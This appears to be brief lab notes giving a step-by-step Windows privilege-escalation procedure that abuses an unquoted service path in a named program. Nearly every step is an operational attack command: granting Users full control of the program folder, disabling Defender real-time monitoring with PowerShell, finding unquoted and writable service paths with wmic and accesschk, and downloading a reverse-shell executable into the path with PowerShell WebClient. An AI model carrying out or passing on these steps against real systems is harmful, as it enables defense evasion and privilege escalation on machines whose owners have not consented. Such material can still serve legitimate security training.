1. Install program vulnerable to unquoted sevices - https://www.netgate.sk/download/download.php?id=11
2. Run CMD as administrator and run the following command to grant write premissions - icacls "C:\Program Files\METGATE" /q /c /t /grant Users:F
3. Disable the antivirus using powershell - powershell.exe Set-mpPreference -DisableRealTimeMonitoring $true
4. Use wmic to list unquoted services - wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """
5. Use accesschk to list write premissions in the service path - .\accesschk -qswu "administrator" "C:\Program Files\METGATE\*"
6. Create a malicious executable/bat to exe script that opens a reverce shell or a cmd and setup a listener
7. Upload the file to the correct path with the correct name using powershell to get him - (New-Object Net.webclient).DownloadFile(['url/file'],'path')
8. Restart the service - Win-key+R > Services.msc > Right-click > Restart
9. Execute whoami on the reverse shell